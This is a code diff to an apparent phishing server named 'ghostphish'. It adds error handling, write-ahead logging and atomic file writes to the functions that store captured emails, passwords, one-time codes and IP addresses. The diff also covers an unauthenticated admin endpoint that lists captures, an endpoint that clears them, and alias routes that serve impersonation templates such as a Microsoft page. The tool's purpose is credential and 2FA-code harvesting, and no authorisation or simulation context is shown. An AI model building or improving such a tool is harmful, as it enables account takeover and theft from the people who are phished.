@@ -86,55 +86,70 @@ TEMPLATES = {
 }
 
 def init_db():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS captures (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            timestamp TEXT,
-            service TEXT,
-            email TEXT,
-            password TEXT,
-            otp TEXT,
-            honeypot TEXT,
-            ip_address TEXT,
-            user_agent TEXT,
-            referer TEXT,
-            attempt_number INTEGER
-        )
-    ''')
-    conn.commit()
-    conn.close()
+    """Initialize database schema. Raises exception on failure (intentional — startup should fail obviously)."""
+    try:
+        os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
+        conn = sqlite3.connect(DB_PATH, timeout=5)
+        conn.execute("PRAGMA journal_mode=WAL")  # Write-Ahead Logging for stability
+        c = conn.cursor()
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS captures (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp TEXT,
+                service TEXT,
+                email TEXT,
+                password TEXT,
+                otp TEXT,
+                honeypot TEXT,
+                ip_address TEXT,
+                user_agent TEXT,
+                referer TEXT,
+                attempt_number INTEGER
+            )
+        ''')
+        conn.commit()
+        conn.close()
+        slog(f"database ready: {DB_PATH}")
+    except Exception as e:
+        slog(f"FATAL: cannot initialize database: {e}")
+        raise
+
+def slog(msg: str) -> None:
+    """Startup/error logging (stderr, no timing — for boot diagnostics)."""
+    print(f"[ghostphish] {msg}", file=sys.stderr, flush=True)
 
 init_db()
 
 def log_capture(service: str, email: str, password: str, otp: str, honeypot: str, ip: str, ua: str, referer: str):
-    """Log phishing attempt"""
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
+    """Log phishing attempt to database. Fails silently (logged to stderr) to not break credential submission."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=5)
+        c = conn.cursor()
 
-    # Get attempt number for this email+service combination
-    c.execute("SELECT COUNT(*) FROM captures WHERE email = ? AND service = ?", (email, service))
-    attempt_num = c.fetchone()[0] + 1
+        # Get attempt number for this email+service combination
+        c.execute("SELECT COUNT(*) FROM captures WHERE email = ? AND service = ?", (email, service))
+        attempt_num = c.fetchone()[0] + 1
 
-    c.execute('''
-        INSERT INTO captures
-        (timestamp, service, email, password, otp, honeypot, ip_address, user_agent, referer, attempt_number)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    ''', (
-        datetime.now().isoformat(),
-        service,
-        email,
-        password,
-        otp,
-        honeypot,
-        ip,
-        ua,
-        referer,
-        attempt_num
-    ))
-    conn.commit()
-    conn.close()
+        c.execute('''
+            INSERT INTO captures
+            (timestamp, service, email, password, otp, honeypot, ip_address, user_agent, referer, attempt_number)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            datetime.now().isoformat(),
+            service,
+            email,
+            password,
+            otp,
+            honeypot,
+            ip,
+            ua,
+            referer,
+            attempt_num
+        ))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        slog(f"warning: could not log capture: {e}")
 
 def get_client_ip(request: Request) -> str:
     """Extract real client IP (handles proxies)"""
@@ -3812,16 +3827,21 @@ async def microsoft_page():
 
 @app.get("/admin/captures", response_class=JSONResponse)
 async def get_captures():
-    """Retrieve all captured data (add auth if needed)"""
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT * FROM captures ORDER BY timestamp DESC LIMIT 100")
+    """Retrieve all captured data. If DB unreachable, return empty captures (don't 500)."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=5)
+        c = conn.cursor()
+        c.execute("SELECT * FROM captures ORDER BY timestamp DESC LIMIT 100")
 
-    columns = [desc[0] for desc in c.description]
-    rows = c.fetchall()
-    conn.close()
+        columns = [desc[0] for desc in c.description]
+        rows = c.fetchall()
+        conn.close()
 
-    captures = [dict(zip(columns, row)) for row in rows]
+        captures = [dict(zip(columns, row)) for row in rows]
+    except Exception as e:
+        slog(f"warning: /admin/captures DB read failed: {e}")
+        captures = []
+
     return {
         "tool": "ghostphish",
         "version": VERSION,
@@ -3833,13 +3853,17 @@ async def get_captures():
 
 @app.post("/admin/clear")
 async def clear_captures():
-    """Clear all captured data"""
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("DELETE FROM captures")
-    conn.commit()
-    conn.close()
-    return {"message": "All captures cleared"}
+    """Clear all captured data. If DB unreachable, return error (don't silently fail)."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=5)
+        c = conn.cursor()
+        c.execute("DELETE FROM captures")
+        conn.commit()
+        conn.close()
+        return {"success": True, "message": "All captures cleared"}
+    except Exception as e:
+        slog(f"error: /admin/clear failed: {e}")
+        raise HTTPException(500, f"Could not clear captures: {e}")
 
 @app.get("/health")
 async def health():
@@ -3852,18 +3876,30 @@ ALIAS_PATH = os.path.join(_data_dir, "aliases.json")
 
 
 def load_aliases() -> dict:
+    """Load custom aliases from disk. Returns empty dict on any error."""
     if not os.path.exists(ALIAS_PATH):
         return {}
     try:
         with open(ALIAS_PATH) as f:
             return json.load(f)
-    except Exception:
+    except Exception as e:
+        slog(f"warning: could not load aliases: {e}")
         return {}
 
 
-def save_aliases(aliases: dict) -> None:
-    with open(ALIAS_PATH, "w") as f:
-        json.dump(aliases, f, indent=2)
+def save_aliases(aliases: dict) -> bool:
+    """Save custom aliases to disk. Returns True on success, False otherwise."""
+    try:
+        os.makedirs(os.path.dirname(ALIAS_PATH), exist_ok=True)
+        # Write to temp file first, then atomic rename
+        temp_path = ALIAS_PATH + ".tmp"
+        with open(temp_path, "w") as f:
+            json.dump(aliases, f, indent=2)
+        os.replace(temp_path, ALIAS_PATH)
+        return True
+    except Exception as e:
+        slog(f"error: could not save aliases: {e}")
+        return False
 
 
 @app.get("/admin/aliases", response_class=JSONResponse)
@@ -3891,18 +3927,20 @@ async def add_alias(request: Request):
 
     aliases = load_aliases()
     aliases[path] = template
-    save_aliases(aliases)
+    if not save_aliases(aliases):
+        raise HTTPException(500, "Could not save alias to disk")
     return {"success": True, "path": path, "template": template}
 
 
 @app.delete("/admin/aliases/{path}")
 async def del_alias(path: str):
     aliases = load_aliases()
-    if path in aliases:
-        del aliases[path]
-        save_aliases(aliases)
-        return {"success": True}
-    raise HTTPException(404, "Alias not found")
+    if path not in aliases:
+        raise HTTPException(404, "Alias not found")
+    del aliases[path]
+    if not save_aliases(aliases):
+        raise HTTPException(500, "Could not save aliases to disk")
+    return {"success": True}
 
 
 # CATCH-ALL — must be LAST route. Serves template based on alias.
